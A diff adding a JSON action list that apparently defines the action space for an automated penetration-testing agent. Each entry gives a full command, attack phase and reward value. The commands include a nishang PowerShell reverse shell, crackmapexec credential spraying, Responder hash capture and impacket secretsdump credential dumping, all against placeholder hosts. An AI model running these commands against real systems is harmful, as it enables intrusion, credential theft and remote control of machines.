@@ -1,0 +1,138 @@
+{
+    "actions": [
+      {
+        "command": "maltego",
+        "full_command": "maltego",
+        "description": "Open-source intelligence and forensics application providing link analysis and data mining capabilities.",
+        "tools": ["maltego"],
+        "parameters": [],
+        "param_descriptions": [],
+        "why": "Visualize and map relationships between individuals, groups, websites, and other entities.",
+        "when": "Initial OSINT gathering phase.",
+        "phase": "Recon",
+        "reward": 115
+      },
+      {
+        "command": "spiderfoot",
+        "full_command": "spiderfoot -s example.com -m ALL",
+        "description": "Automated OSINT tool to gather intelligence on domains, IPs, and people.",
+        "tools": ["spiderfoot"],
+        "parameters": ["-s", "-m ALL"],
+        "param_descriptions": [
+          "Target domain or IP.",
+          "Modules to run (ALL executes all modules)."
+        ],
+        "why": "Automate reconnaissance and threat intelligence gathering.",
+        "when": "Pre-attack intelligence collection.",
+        "phase": "Recon",
+        "reward": 100
+      },
+      {
+        "command": "osmedeus",
+        "full_command": "osmedeus -t example.com",
+        "description": "Automated offensive security framework for scanning and vulnerability assessment.",
+        "tools": ["osmedeus"],
+        "parameters": ["-t"],
+        "param_descriptions": [
+          "Target domain to scan."
+        ],
+        "why": "Run automated scanning for recon and vulnerability discovery.",
+        "when": "Initial assessment before manual recon.",
+        "phase": "Recon",
+        "reward": 105
+      },
+      {
+        "command": "crackmapexec",
+        "full_command": "crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt --shares",
+        "description": "Swiss army knife for pentesting networks supporting SMB, RDP, WinRM.",
+        "tools": ["crackmapexec"],
+        "parameters": ["smb", "-u", "-p", "--shares"],
+        "param_descriptions": [
+          "Protocol to use (SMB).",
+          "Usernames file.",
+          "Passwords file.",
+          "List SMB shares."
+        ],
+        "why": "Quickly test and enumerate credentials across SMB services.",
+        "when": "After gaining access to user credentials.",
+        "phase": "Exploitation",
+        "reward": 130
+      },
+      {
+        "command": "kerbrute",
+        "full_command": "kerbrute userenum -d example.com --dc 10.10.10.10 users.txt",
+        "description": "Tool for enumerating valid Active Directory accounts through Kerberos.",
+        "tools": ["kerbrute"],
+        "parameters": ["userenum", "-d", "--dc"],
+        "param_descriptions": [
+          "User enumeration mode.",
+          "Specify domain.",
+          "Domain controller IP."
+        ],
+        "why": "Enumerate valid AD accounts without triggering lockouts.",
+        "when": "AD environment recon.",
+        "phase": "Recon",
+        "reward": 110
+      },
+      {
+        "command": "bloodhound-python",
+        "full_command": "bloodhound-python -u user -p pass -d example.com -c All",
+        "description": "Active Directory enumeration tool collecting relationships and ACLs.",
+        "tools": ["bloodhound-python"],
+        "parameters": ["-u", "-p", "-d", "-c All"],
+        "param_descriptions": [
+          "Username.",
+          "Password.",
+          "Domain.",
+          "Collect all data types."
+        ],
+        "why": "Map AD relationships for privilege escalation paths.",
+        "when": "Post-compromise in AD environments.",
+        "phase": "Post-Exploitation",
+        "reward": 140
+      },
+      {
+        "command": "nishang",
+        "full_command": "Import-Module ./Shells/Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444",
+        "description": "PowerShell-based exploitation and post-exploitation framework.",
+        "tools": ["nishang"],
+        "parameters": [],
+        "param_descriptions": [],
+        "why": "Achieve reverse shell access using native PowerShell scripts.",
+        "when": "After compromising Windows hosts.",
+        "phase": "Post-Exploitation",
+        "reward": 135
+      },
+      {
+        "command": "responder",
+        "full_command": "responder -I eth0 -wrf",
+        "description": "LLMNR, NBT-NS and MDNS poisoner targeting Windows networks.",
+        "tools": ["responder"],
+        "parameters": ["-I", "-wrf"],
+        "param_descriptions": [
+          "Network interface.",
+          "Enable multiple poisoning modules (WRF)."
+        ],
+        "why": "Capture NetNTLM hashes and credentials in Windows networks.",
+        "when": "During internal penetration tests.",
+        "phase": "Exploitation",
+        "reward": 120
+      },
+      {
+        "command": "impacket-secretsdump",
+        "full_command": "secretsdump.py -target-ip 10.10.10.10 EXAMPLE/user:password",
+        "description": "Dump credentials including LSA secrets and NTLM hashes from remote machines.",
+        "tools": ["impacket-secretsdump"],
+        "parameters": ["-target-ip", "EXAMPLE/user:password"],
+        "param_descriptions": [
+          "Target IP address.",
+          "Domain user credentials."
+        ],
+        "why": "Extract valuable credential material for further lateral movement.",
+        "when": "Post-compromise, after credential access.",
+        "phase": "Post-Exploitation",
+        "reward": 145
+      }
+    ]
+  }
+  
